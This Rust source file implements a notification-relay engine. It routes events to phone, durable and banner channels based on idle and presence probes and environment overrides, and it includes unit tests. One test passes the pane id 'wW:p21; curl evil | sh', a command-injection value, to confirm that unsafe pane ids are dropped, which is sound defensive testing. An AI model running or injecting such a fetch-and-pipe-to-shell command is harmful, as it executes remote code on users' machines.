//! The engine: one event in, a delivery plan out, every decision delegated.
//!
//! This module ORCHESTRATES the decision core against the probe seams; it
//! owns no policy of its own. Two properties are load-bearing and pinned by
//! recording probes rather than by outcomes alone:
//!
//! PROBES RUN ONLY WHEN THEIR ANSWER COULD MATTER. The idle probe is an
//! unbounded pipe on a path that must never stall; a caller that already
//! decided the phone leg (narrowing flags, skip, force, an idle override)
//! must not pay for a reading it cannot use. The attention probes are
//! confined to the one band where they can change the verdict, and the
//! one-second viewing sample runs only when the panes already match.
//!
//! CALLER INTENT IS NEVER OVERRIDDEN. Skip beats force ("I already sent it"
//! is more specific than an override), the narrowing flags beat both, and
//! force exempts the event from viewed-pane suppression.

use std::collections::BTreeMap;

use crate::probes::{FocusedPaneProbe, IdleProbe, MoshRateProbe, PhoneMarkerProbe};
use crate::registry::Selection;
use crate::routing::Leg;

/// The idle threshold the bash defaults to when `RELAY_DESK_IDLE_SECS` says
/// nothing: past this the operator counts as away from the desk.
const DEFAULT_DESK_IDLE_SECS: u64 = 120;

/// Everything the environment may override, parsed once at the edge.
/// Garbage numeric values read as absent, never as zero.
#[derive(Debug, Default, PartialEq)]
pub struct Overrides {
    pub idle_secs: Option<u64>,
    pub desk_idle_secs: Option<u64>,
    pub skip_phone: bool,
    pub force_phone: bool,
    pub phone_attention: Option<bool>,
    pub moshi_viewing: Option<bool>,
    pub focused_pane: Option<String>,
    pub marker_ttl_secs: Option<u64>,
    pub attention_floor_bytes: Option<u64>,
    pub physical_fresh_secs: Option<u64>,
}

impl Overrides {
    /// Parse the RELAY_* and PNS_* variables out of an environment map.
    pub fn from_env(vars: &BTreeMap<String, String>) -> Self {
        let count = |key: &str| vars.get(key).and_then(|raw| crate::parse_count(raw));
        let set = |key: &str| vars.get(key).is_some_and(|raw| !raw.is_empty());
        let forced = |key: &str| match vars.get(key).map(String::as_str) {
            Some("1") => Some(true),
            Some("0") => Some(false),
            _ => None,
        };
        Self {
            idle_secs: count("RELAY_IDLE_SECS"),
            desk_idle_secs: count("RELAY_DESK_IDLE_SECS"),
            skip_phone: set("RELAY_SKIP_PHONE"),
            force_phone: set("RELAY_FORCE_PHONE"),
            phone_attention: forced("RELAY_PHONE_ATTENTION"),
            moshi_viewing: forced("RELAY_MOSHI_VIEWING"),
            focused_pane: vars
                .get("RELAY_HERDR_FOCUSED_PANE")
                .filter(|pane| !pane.is_empty())
                .cloned(),
            marker_ttl_secs: count("PNS_PHONE_MARKER_TTL"),
            attention_floor_bytes: count("PNS_ATTENTION_FLOOR_BYTES"),
            physical_fresh_secs: count("PNS_PHYSICAL_FRESH_SECS"),
        }
    }
}

/// What the engine decided for one event.
#[derive(Debug, PartialEq)]
pub struct Decision {
    /// The legs to dispatch, in delivery order.
    pub legs: Vec<Leg>,
    /// The pane was dropped from the event because it failed the safety
    /// check; the caller prints the one warning.
    pub pane_dropped: bool,
}

/// Decide the plan for one event. `now_secs` is the wall clock, taken once
/// at the edge; `None` reads as an unreadable clock and fails the marker
/// check closed.
pub fn decide<P>(
    probes: &P,
    selection: &Selection,
    overrides: &Overrides,
    local_only: bool,
    remote_only: bool,
    pane: &str,
    now_secs: Option<u64>,
) -> Decision
where
    P: IdleProbe + PhoneMarkerProbe + MoshRateProbe + FocusedPaneProbe,
{
    use crate::presence::{
        DEFAULT_ATTENTION_FLOOR_BYTES, DEFAULT_PHONE_MARKER_TTL_SECS, DEFAULT_PHYSICAL_FRESH_SECS,
        attention_band, marker_fresh, mosh_rate_active, moshi_viewing, phone_attention,
    };

    let desk_idle_secs = Some(overrides.desk_idle_secs.unwrap_or(DEFAULT_DESK_IDLE_SECS));
    let decided_without_a_reading =
        local_only || remote_only || overrides.skip_phone || overrides.force_phone;
    let idle_secs = match overrides.idle_secs {
        Some(secs) => Some(secs),
        None if decided_without_a_reading => None,
        None => probes.idle_secs(),
    };

    // Skip beats force, so it gates the whole verdict rather than riding in
    // as another argument.
    let mut want_phone = !overrides.skip_phone
        && crate::routing::wants_phone(
            idle_secs,
            desk_idle_secs,
            local_only,
            remote_only,
            overrides.force_phone,
        );

    // Each reading is guarded by the verdict that would discard it, so a
    // forced answer never pays for the probe underneath it.
    let viewing_now = || {
        let rate_active = overrides.moshi_viewing.is_none()
            && probes.sample_csv().is_some_and(|csv| {
                mosh_rate_active(
                    &csv,
                    overrides
                        .attention_floor_bytes
                        .unwrap_or(DEFAULT_ATTENTION_FLOOR_BYTES),
                )
            });
        moshi_viewing(overrides.moshi_viewing, rate_active)
    };

    if !want_phone
        && !local_only
        && !remote_only
        && !overrides.skip_phone
        && attention_band(
            idle_secs,
            desk_idle_secs,
            Some(
                overrides
                    .physical_fresh_secs
                    .unwrap_or(DEFAULT_PHYSICAL_FRESH_SECS),
            ),
        )
    {
        let marker_is_fresh = overrides.phone_attention.is_none()
            && marker_fresh(
                probes.marker_mtime_secs(),
                now_secs,
                Some(
                    overrides
                        .marker_ttl_secs
                        .unwrap_or(DEFAULT_PHONE_MARKER_TTL_SECS),
                ),
            );
        // The marker is a stat of one file; the sample is a full second of
        // live counters, so it runs only once the marker has said nothing.
        let viewing = overrides.phone_attention.is_none() && !marker_is_fresh && viewing_now();
        want_phone = phone_attention(overrides.phone_attention, marker_is_fresh, viewing);
    }

    if want_phone && !overrides.force_phone && !pane.is_empty() {
        let focused = match &overrides.focused_pane {
            Some(pane) => Some(pane.clone()),
            None => probes.focused_pane(),
        };
        if crate::routing::viewed_pane_redundant(pane, &focused.unwrap_or_default())
            && viewing_now()
        {
            want_phone = false;
        }
    }

    Decision {
        legs: crate::routing::channel_plan(selection, local_only, remote_only, want_phone),
        pane_dropped: !pane.is_empty() && !crate::safety::pane_is_safe(pane),
    }
}

/// Which plugins run, given what loading the config found. The composition
/// policy in one place:
///
/// A LOADED config is authoritative. A MISSING config selects every built-in,
/// so the cutover from the bash engine changes nothing until an operator
/// opts in by writing one. A BROKEN config (unreadable, malformed, invalid,
/// or naming an unknown plugin) is LOUD, the returned warning, but still
/// selects every built-in: on an always-exit-0 notification path, a config
/// error that silently turned every notification off would be the exact
/// failure the config layer exists to refuse.
pub fn select_plugins(
    registry: &crate::registry::Registry,
    loaded: Result<crate::config::LoadOutcome, crate::config::ConfigError>,
) -> (Selection, Option<String>) {
    let _ = (registry, loaded);
    todo!("R2d: loaded is authoritative, missing is the roster, broken is loud plus the roster")
}

/// One leg's event, as the JSON object the channel contract specifies.
/// The pane is the SANITIZED one: an unsafe id was already dropped.
#[allow(clippy::too_many_arguments)]
pub fn event_json(
    agent: &str,
    state: &str,
    project: &str,
    branch: &str,
    detail: &str,
    title: &str,
    message: &str,
    preview: &str,
    pane: &str,
    mode: &str,
) -> String {
    serde_json::json!({
        "agent": agent,
        "state": state,
        "project": project,
        "branch": branch,
        "detail": detail,
        "title": title,
        "message": message,
        "preview": preview,
        "pane": pane,
        "mode": mode,
    })
    .to_string()
}

#[cfg(test)]
mod tests {
    use super::{Decision, Overrides, decide, event_json};
    use crate::config::parse_config;
    use crate::probes::{FocusedPaneProbe, IdleProbe, MoshRateProbe, PhoneMarkerProbe};
    use crate::registry::{Registry, Routing, Selection};
    use std::cell::Cell;
    use std::collections::BTreeMap;

    /// Recording probes: every reading is counted, so a test can pin that a
    /// probe was never consulted, not only what the verdict was.
    #[derive(Default)]
    struct CountingProbes {
        idle: Option<u64>,
        marker_mtime: Option<u64>,
        sample: Option<String>,
        focused: Option<String>,
        idle_reads: Cell<u32>,
        marker_reads: Cell<u32>,
        sample_reads: Cell<u32>,
        focused_reads: Cell<u32>,
    }

    impl IdleProbe for CountingProbes {
        fn idle_secs(&self) -> Option<u64> {
            self.idle_reads.set(self.idle_reads.get() + 1);
            self.idle
        }
    }
    impl PhoneMarkerProbe for CountingProbes {
        fn marker_mtime_secs(&self) -> Option<u64> {
            self.marker_reads.set(self.marker_reads.get() + 1);
            self.marker_mtime
        }
    }
    impl MoshRateProbe for CountingProbes {
        fn sample_csv(&self) -> Option<String> {
            self.sample_reads.set(self.sample_reads.get() + 1);
            self.sample.clone()
        }
    }
    impl FocusedPaneProbe for CountingProbes {
        fn focused_pane(&self) -> Option<String> {
            self.focused_reads.set(self.focused_reads.get() + 1);
            self.focused.clone()
        }
    }

    fn three_selection() -> Selection {
        let mut registry = Registry::new();
        registry
            .register(
                "moshi",
                Routing {
                    local: false,
                    presence_gated: true,
                    durable: false,
                },
            )
            .unwrap();
        registry
            .register(
                "hermes",
                Routing {
                    local: false,
                    presence_gated: false,
                    durable: true,
                },
            )
            .unwrap();
        registry
            .register(
                "macos-banner",
                Routing {
                    local: true,
                    presence_gated: false,
                    durable: false,
                },
            )
            .unwrap();
        registry
            .enabled(
                &parse_config(
                    "[plugins.moshi]\nenabled = true\n[plugins.hermes]\nenabled = true\n[plugins.macos-banner]\nenabled = true\n",
                )
                .unwrap(),
            )
            .unwrap()
    }

    fn names(decision: &Decision) -> Vec<&str> {
        decision.legs.iter().map(|leg| leg.name).collect()
    }

    // --- caller intent ------------------------------------------------------

    #[test]
    fn skip_phone_beats_force_phone_because_already_sent_is_more_specific() {
        let probes = CountingProbes::default();
        let overrides = Overrides {
            skip_phone: true,
            force_phone: true,
            ..Overrides::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &overrides,
            false,
            false,
            "",
            Some(1_000_000),
        );
        assert_eq!(names(&decision), vec!["hermes", "macos-banner"]);
    }

    #[test]
    fn a_decided_phone_leg_never_pays_for_the_idle_probe() {
        // Force, skip, and an idle override each decide the verdict without
        // the reading; the probe is an unbounded pipe on a path that must
        // never stall for an answer it cannot use.
        for overrides in [
            Overrides {
                force_phone: true,
                ..Overrides::default()
            },
            Overrides {
                skip_phone: true,
                ..Overrides::default()
            },
            Overrides {
                idle_secs: Some(99_999),
                ..Overrides::default()
            },
        ] {
            let probes = CountingProbes::default();
            decide(
                &probes,
                &three_selection(),
                &overrides,
                false,
                false,
                "",
                Some(1_000_000),
            );
            assert_eq!(probes.idle_reads.get(), 0, "overrides: {overrides:?}");
        }
    }

    #[test]
    fn a_narrowing_flag_skips_the_idle_probe_too() {
        for (local, remote) in [(true, false), (false, true)] {
            let probes = CountingProbes::default();
            decide(
                &probes,
                &three_selection(),
                &Overrides::default(),
                local,
                remote,
                "",
                Some(1_000_000),
            );
            assert_eq!(probes.idle_reads.get(), 0);
        }
    }

    // --- the attention override ---------------------------------------------

    #[test]
    fn in_the_band_a_fresh_marker_flips_the_desk_verdict_to_away() {
        // Idle 60 with desk 120 reads "at the desk"; the Back Tap marker
        // touched 10 seconds ago proves the phone is in hand, so the phone
        // leg fires anyway.
        let probes = CountingProbes {
            idle: Some(60),
            marker_mtime: Some(999_990),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "",
            Some(1_000_000),
        );
        assert_eq!(names(&decision), vec!["moshi", "hermes", "macos-banner"]);
    }

    #[test]
    fn below_the_band_the_attention_probes_are_never_consulted() {
        // A keypress 5 seconds ago proves where the hands are; no marker or
        // byte-rate reading may overrule it, so neither is taken.
        let probes = CountingProbes {
            idle: Some(5),
            marker_mtime: Some(999_999),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "",
            Some(1_000_000),
        );
        assert_eq!(names(&decision), vec!["hermes", "macos-banner"]);
        assert_eq!(probes.marker_reads.get(), 0);
        assert_eq!(probes.sample_reads.get(), 0);
    }

    #[test]
    fn an_unreadable_clock_fails_the_marker_check_closed_but_never_the_push_itself() {
        // now_secs None: the marker cannot be judged fresh, so no attention
        // override fires; the ordinary away rule still pushes on its own.
        let probes = CountingProbes {
            idle: Some(60),
            marker_mtime: Some(999_990),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "",
            None,
        );
        assert_eq!(names(&decision), vec!["hermes", "macos-banner"]);
    }

    // --- viewed-pane suppression --------------------------------------------

    #[test]
    fn the_watched_pane_suppresses_only_the_phone_leg() {
        let probes = CountingProbes {
            idle: Some(900),
            focused: Some("wW:p21".to_string()),
            ..CountingProbes::default()
        };
        let overrides = Overrides {
            moshi_viewing: Some(true),
            ..Overrides::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &overrides,
            false,
            false,
            "wW:p21",
            Some(1_000_000),
        );
        assert_eq!(names(&decision), vec!["hermes", "macos-banner"]);
    }

    #[test]
    fn force_phone_exempts_the_event_from_viewed_pane_suppression() {
        let probes = CountingProbes {
            focused: Some("wW:p21".to_string()),
            ..CountingProbes::default()
        };
        let overrides = Overrides {
            force_phone: true,
            moshi_viewing: Some(true),
            ..Overrides::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &overrides,
            false,
            false,
            "wW:p21",
            Some(1_000_000),
        );
        assert!(names(&decision).contains(&"moshi"));
    }

    #[test]
    fn a_different_focused_pane_never_pays_for_the_viewing_sample() {
        // The one-second sample runs only when the panes already match.
        let probes = CountingProbes {
            idle: Some(900),
            focused: Some("wW:p7".to_string()),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "wW:p21",
            Some(1_000_000),
        );
        assert!(names(&decision).contains(&"moshi"));
        assert_eq!(probes.sample_reads.get(), 0);
    }

    // --- pane safety and the event ------------------------------------------

    #[test]
    fn an_unsafe_pane_is_dropped_once_for_every_channel() {
        let probes = CountingProbes {
            idle: Some(900),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "wW:p21; curl evil | sh",
            Some(1_000_000),
        );
        assert!(decision.pane_dropped);
    }

    #[test]
    fn a_safe_pane_is_not_dropped() {
        let probes = CountingProbes {
            idle: Some(900),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "wW:p21",
            Some(1_000_000),
        );
        assert!(!decision.pane_dropped);
    }

    #[test]
    fn the_event_is_the_channel_contracts_json_object() {
        let event = event_json(
            "claude",
            "done",
            "dotfiles",
            "main",
            "a \"quoted\" detail",
            "claude done: dotfiles",
            "main: a detail",
            "a preview",
            "wW:p21",
            "async",
        );
        let parsed: serde_json::Value = serde_json::from_str(&event).unwrap();
        assert_eq!(parsed["agent"], "claude");
        assert_eq!(parsed["detail"], "a \"quoted\" detail");
        assert_eq!(parsed["pane"], "wW:p21");
        assert_eq!(parsed["mode"], "async");
        assert_eq!(parsed["title"], "claude done: dotfiles");
    }

    // --- plugin selection at the composition root ---------------------------

    fn three_registry() -> Registry {
        let mut registry = Registry::new();
        registry
            .register(
                "moshi",
                Routing {
                    local: false,
                    presence_gated: true,
                    durable: false,
                },
            )
            .unwrap();
        registry
            .register(
                "hermes",
                Routing {
                    local: false,
                    presence_gated: false,
                    durable: true,
                },
            )
            .unwrap();
        registry
            .register(
                "macos-banner",
                Routing {
                    local: true,
                    presence_gated: false,
                    durable: false,
                },
            )
            .unwrap();
        registry
    }

    fn selection_names(selection: &Selection) -> Vec<&str> {
        selection.iter().map(|r| r.name).collect()
    }

    #[test]
    fn a_missing_config_selects_every_builtin_so_the_cutover_changes_nothing() {
        use crate::config::LoadOutcome;
        let (selection, warning) =
            super::select_plugins(&three_registry(), Ok(LoadOutcome::Missing));
        assert_eq!(
            selection_names(&selection),
            vec!["moshi", "hermes", "macos-banner"]
        );
        assert_eq!(warning, None);
    }

    #[test]
    fn a_loaded_config_is_authoritative() {
        use crate::config::LoadOutcome;
        let config = parse_config("[plugins.hermes]\nenabled = true\n").unwrap();
        let (selection, warning) =
            super::select_plugins(&three_registry(), Ok(LoadOutcome::Loaded(config)));
        assert_eq!(selection_names(&selection), vec!["hermes"]);
        assert_eq!(warning, None);
    }

    #[test]
    fn a_broken_config_is_loud_but_never_turns_notifications_off() {
        use crate::config::ConfigError;
        let (selection, warning) = super::select_plugins(
            &three_registry(),
            Err(ConfigError::Malformed(
                "key with no value at line 1".to_string(),
            )),
        );
        assert_eq!(
            selection_names(&selection),
            vec!["moshi", "hermes", "macos-banner"]
        );
        let warning = warning.expect("a broken config must be said aloud");
        assert!(warning.contains("key with no value"));
    }

    #[test]
    fn a_config_naming_an_unknown_plugin_is_loud_and_falls_back_to_the_roster() {
        use crate::config::LoadOutcome;
        let config = parse_config("[plugins.mosih]\nenabled = true\n").unwrap();
        let (selection, warning) =
            super::select_plugins(&three_registry(), Ok(LoadOutcome::Loaded(config)));
        assert_eq!(
            selection_names(&selection),
            vec!["moshi", "hermes", "macos-banner"]
        );
        let warning = warning.expect("the typo'd name must be said aloud");
        assert!(warning.contains("mosih"));
    }

    // --- overrides parsing --------------------------------------------------

    #[test]
    fn a_garbage_numeric_override_reads_as_absent_never_zero() {
        // Zero idle reads as "actively typing" and suppresses the push; a
        // garbled value must instead leave the probe to answer.
        let vars = BTreeMap::from([
            ("RELAY_IDLE_SECS".to_string(), "not-a-number".to_string()),
            ("RELAY_DESK_IDLE_SECS".to_string(), "120".to_string()),
        ]);
        let overrides = Overrides::from_env(&vars);
        assert_eq!(overrides.idle_secs, None);
        assert_eq!(overrides.desk_idle_secs, Some(120));
    }

    #[test]
    fn skip_and_force_parse_from_their_relay_variables() {
        let vars = BTreeMap::from([
            ("RELAY_SKIP_PHONE".to_string(), "1".to_string()),
            ("RELAY_FORCE_PHONE".to_string(), "1".to_string()),
        ]);
        let overrides = Overrides::from_env(&vars);
        assert!(overrides.skip_phone);
        assert!(overrides.force_phone);
    }
}
